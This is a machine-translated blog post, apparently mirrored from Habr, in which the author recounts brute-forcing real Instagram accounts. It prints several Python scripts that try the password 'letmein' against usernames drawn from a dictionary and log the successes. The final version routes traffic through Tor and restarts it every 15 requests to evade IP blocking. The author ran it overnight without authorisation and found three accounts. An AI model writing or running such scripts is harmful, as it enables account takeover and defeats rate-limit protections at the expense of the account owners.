<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I took a little Instagram</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="It all started after I read an article about the most popular passwords in 2013. Like many, I think, I instantly wanted to check whether these passwor...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I took a little Instagram</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/a3a/cd7/a12/a3acd7a126cad46f24935b1d06916688.png"><br><br>  It all started after I read <a href="http://habrahabr.ru/post/215457/">an article</a> about the most popular passwords in 2013.  Like many, I think, I instantly wanted to check whether these passwords are really so popular.  After some deliberation, the choice fell on a social network / photo sharing service - Instagram. <br><br><a name="habracut"></a><br><h4>  The first steps </h4><br>  The first thing I did was check how exactly the web version of this miracle responds to the input with the correct and incorrect password.  Everything turned out to be standard, I was even a little glad.  If the password is incorrect from the server, the answer is with code 200, if it is correct, code 302 comes in and redirects to the main page.  That's enough, I start writing a script in python, which will substitute the username and password in the form, and then find out whether it came up or not. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      He looked like this: <br><blockquote><pre><code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib login_data=urllib.urlensource({<span class="hljs-string"><span class="hljs-string">'username'</span></span>:<span class="hljs-string"><span class="hljs-string">'username'</span></span>,<span class="hljs-string"><span class="hljs-string">'password'</span></span>:<span class="hljs-string"><span class="hljs-string">'password'</span></span>,<span class="hljs-string"><span class="hljs-string">'submit'</span></span>:<span class="hljs-string"><span class="hljs-string">'Login'</span></span>}) response = urllib.urlopen(<span class="hljs-string"><span class="hljs-string">'https://instagram.com/accounts/login/'</span></span>,login_data) f = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'dex.html'</span></span>,<span class="hljs-string"><span class="hljs-string">'w'</span></span>) f.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(response.<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>()) f.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>() print <span class="hljs-string"><span class="hljs-string">'ok'</span></span></code> </pre> <br></blockquote><br><br>  The first test gave the error "Enable cookies" ("This page could not be loaded. If you have cookies, please click on it." . ‚Äù) I didn‚Äôt have much time, so I chose a quick solution to this problem, which I usually use for tests of my creations, namely, mechanize.  More precisely, even mechanize.Browser (). <br><br>  The second version looked like this: <br><blockquote><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> mechanize <span class="hljs-type"><span class="hljs-type">name</span></span> = <span class="hljs-string"><span class="hljs-string">'username'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'password'</span></span> br = mechanize.Browser() br.<span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'https://instagram.com/accounts/login/'</span></span>) br.select_form(nr = <span class="hljs-number"><span class="hljs-number">0</span></span>) br.form[<span class="hljs-string"><span class="hljs-string">'username'</span></span>] = <span class="hljs-type"><span class="hljs-type">name</span></span> br.form[<span class="hljs-string"><span class="hljs-string">'password'</span></span>] = <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> br.submit() f = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'dex.html'</span></span>,<span class="hljs-string"><span class="hljs-string">'w'</span></span>) f.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(br.response().<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>()) f.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>() print <span class="hljs-string"><span class="hljs-string">'ok'</span></span></code> </pre><br></blockquote><br><br><h4>  Temporary success </h4><br>  And, lo and behold!  With a valid and incorrect login / password pair, everything was worked out as needed.  But the server response code in both situations came 200. This is not scary, because in the answer we see the very page that came.  Just look at any phrase on the page, saying that the password did not fit.  If not, then we are fine, we found a user with a weak password. <br><br>  It looked like this to me: <br><br><blockquote><pre> <code class="hljs lua"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> br.response().<span class="hljs-built_in"><span class="hljs-built_in">read</span></span>().<span class="hljs-built_in"><span class="hljs-built_in">find</span></span>(<span class="hljs-string"><span class="hljs-string">'correct username'</span></span>) == <span class="hljs-number"><span class="hljs-number">-1</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">print</span></span> <span class="hljs-string"><span class="hljs-string">'YEP'</span></span> log_list = <span class="hljs-built_in"><span class="hljs-built_in">open</span></span>(<span class="hljs-string"><span class="hljs-string">'log_list.txt'</span></span>,<span class="hljs-string"><span class="hljs-string">'ab+'</span></span>) log_list.<span class="hljs-built_in"><span class="hljs-built_in">write</span></span>(name + <span class="hljs-string"><span class="hljs-string">' '</span></span> + password + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>) log_list.<span class="hljs-built_in"><span class="hljs-built_in">close</span></span>() <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">print</span></span> <span class="hljs-string"><span class="hljs-string">'NOPE'</span></span></code> </pre><br></blockquote><br>  As long as everything went smoothly.  I never found the Sitemap, so I connected the standard English word dictionary for ubuntu (/ usr / share / dict / american-english) from which I took all the words without an apostrophe, and the password database was reduced , under the conditions of the experiment, to the base of the above-mentioned article.  But from the entire database, a manual search revealed only one password suitable for the service (it does not allow instagrames to use too simple passwords).  It has become not so interesting, but did not want to stop.  Along the way, I made a check whether there is even a user with such a login so as not to run in vain + to take into account only existing users in the statistics.  This is an experiment! <br><br>  All together it already looked like this: <br><br><blockquote><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> mechanize def check_url(url): p = urlparse(url) conn = httplib.HTTPConnection(p.netloc) conn.request(<span class="hljs-string"><span class="hljs-string">'HEAD'</span></span>, p.path) resp = conn.getresponse() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> resp.status &lt; <span class="hljs-number"><span class="hljs-number">400</span></span> names = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'american-english'</span></span>,<span class="hljs-string"><span class="hljs-string">'r'</span></span>).<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>().split(<span class="hljs-string"><span class="hljs-string">'\n'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'letmein'</span></span> number = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> <span class="hljs-type"><span class="hljs-type">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> names: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-type"><span class="hljs-type">name</span></span>.find("'") == <span class="hljs-number"><span class="hljs-number">-1</span></span>: number += <span class="hljs-number"><span class="hljs-number">1</span></span> url = <span class="hljs-string"><span class="hljs-string">'https://instagram.com/'</span></span>+<span class="hljs-type"><span class="hljs-type">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> check_url(url): print <span class="hljs-string"><span class="hljs-string">'not exist'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: print str(number) + <span class="hljs-string"><span class="hljs-string">' '</span></span> + <span class="hljs-type"><span class="hljs-type">name</span></span> br = mechanize.Browser() br.<span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'https://instagram.com/accounts/login/'</span></span>) br.select_form(nr = <span class="hljs-number"><span class="hljs-number">0</span></span>) br.form[<span class="hljs-string"><span class="hljs-string">'username'</span></span>] = <span class="hljs-type"><span class="hljs-type">name</span></span> br.form[<span class="hljs-string"><span class="hljs-string">'password'</span></span>] = <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> br.submit() s = br.response().<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>().find(<span class="hljs-string"><span class="hljs-string">'correct username'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> s == <span class="hljs-number"><span class="hljs-number">-1</span></span>: print <span class="hljs-string"><span class="hljs-string">'YEP'</span></span> log_list = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'log_list.txt'</span></span>,<span class="hljs-string"><span class="hljs-string">'ab+'</span></span>) log_list.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(<span class="hljs-type"><span class="hljs-type">name</span></span> + <span class="hljs-string"><span class="hljs-string">' '</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>) log_list.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>() <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: print <span class="hljs-string"><span class="hljs-string">'NOPE'</span></span></code> </pre><br></blockquote><br><br><h4>  Not the most reliable protection against brute force </h4><br>  After 20 iterations, the instagram began to spit me out with a 403 Forbidden error (access denied).  Their server guessed that I was doing something bad.  I tried to play with different cookies and browser substitutions.  No, I did not let it in, so banyat by ip  Need to use a proxy.  The fastest solution for anonymous login I found tor.  By the method of scientific tyke, it was determined that a change of ip is required approximately after every 15 hits.  The car has earned! <br><br>  Final script: <br><br><blockquote><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os, socks, socket, mechanize, cookielib, httplib <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urlparse <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urlparse def check_url(url): p = urlparse(url) conn = httplib.HTTPConnection(p.netloc) conn.request(<span class="hljs-string"><span class="hljs-string">'HEAD'</span></span>, p.path) resp = conn.getresponse() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> resp.status &lt; <span class="hljs-number"><span class="hljs-number">400</span></span> def create_connection(address, timeout=<span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, source_address=<span class="hljs-keyword"><span class="hljs-keyword">None</span></span>): sock = socks.socksocket() sock.<span class="hljs-keyword"><span class="hljs-keyword">connect</span></span>(address) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> sock socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", <span class="hljs-number"><span class="hljs-number">9050</span></span>) socket.socket = socks.socksocket socket.create_connection = create_connection names = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'american-english'</span></span>,<span class="hljs-string"><span class="hljs-string">'r'</span></span>).<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>().split(<span class="hljs-string"><span class="hljs-string">'\n'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'letmein'</span></span> number = <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> <span class="hljs-type"><span class="hljs-type">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> names: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-type"><span class="hljs-type">name</span></span>.find("'") == <span class="hljs-number"><span class="hljs-number">-1</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> number%<span class="hljs-number"><span class="hljs-number">15</span></span> == <span class="hljs-number"><span class="hljs-number">0</span></span>: os.<span class="hljs-keyword"><span class="hljs-keyword">system</span></span>(<span class="hljs-string"><span class="hljs-string">'service tor restart'</span></span>) number += <span class="hljs-number"><span class="hljs-number">1</span></span> url = <span class="hljs-string"><span class="hljs-string">'https://instagram.com/'</span></span>+<span class="hljs-type"><span class="hljs-type">name</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> check_url(url): print <span class="hljs-string"><span class="hljs-string">'not exist'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: try: print str(number) + <span class="hljs-string"><span class="hljs-string">' '</span></span> + <span class="hljs-type"><span class="hljs-type">name</span></span> br = mechanize.Browser() br.set_handle_equiv(<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) br.set_handle_redirect(<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) br.set_handle_robots(<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>) br.<span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'https://instagram.com/accounts/login/'</span></span>) br.select_form(nr = <span class="hljs-number"><span class="hljs-number">0</span></span>) br.form[<span class="hljs-string"><span class="hljs-string">'username'</span></span>] = <span class="hljs-type"><span class="hljs-type">name</span></span> br.form[<span class="hljs-string"><span class="hljs-string">'password'</span></span>] = <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> br.submit() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> br.response().<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>().find(<span class="hljs-string"><span class="hljs-string">'correct username'</span></span>) == <span class="hljs-number"><span class="hljs-number">-1</span></span>: print <span class="hljs-string"><span class="hljs-string">'YEP'</span></span> log_list = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'log_list.txt'</span></span>,<span class="hljs-string"><span class="hljs-string">'ab+'</span></span>) log_list.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(<span class="hljs-type"><span class="hljs-type">name</span></span> + <span class="hljs-string"><span class="hljs-string">' '</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> + <span class="hljs-string"><span class="hljs-string">'\n'</span></span>) log_list.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>() <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: print <span class="hljs-string"><span class="hljs-string">'NOPE'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: print <span class="hljs-string"><span class="hljs-string">'something wrong'</span></span> pass</code> </pre><br></blockquote><br><br>  Left him to work overnight. <br><br><h4>  About the results. </h4><br>  In the morning I woke up like in the New Year in anticipation, what a gift my hardworking elf left me.  In total, 9103 names were verified (far from all of the list, I stopped the script), three of them used a vulnerable password.  This is about 0.03% of respondents - not so little.  I would be glad if there was at least one.  I contacted account holders asking them to change their password.  Now in the world 3 people use weak passwords less, protecting their favorite photos. <br><br>  Thank you all for your attention. </div><p>Source: <a href="https://habr.com/ru/post/215829/">https://habr.com/ru/post/215829/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../215817/index.html">Advanced methods of implicitly calling php code used in malicious scripts</a></li>
<li><a href="../215819/index.html">Content Marketing: 9 Openness Lessons</a></li>
<li><a href="../215823/index.html">How to keep finances in the stock market: Risk management</a></li>
<li><a href="../215825/index.html">Helicopter hangar, controlled from the aircraft</a></li>
<li><a href="../215827/index.html">Changes in copyright</a></li>
<li><a href="../215831/index.html">Pwn2Own 2014: results</a></li>
<li><a href="../215835/index.html">Compiling sources (cpp, cs) with Visual Studio compiler without running IDE on Windows</a></li>
<li><a href="../215837/index.html">Documentation in software development</a></li>
<li><a href="../215839/index.html">Adding HDD to the "moody" laptop</a></li>
<li><a href="../215841/index.html">Part 2. HID device for camera rotation</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>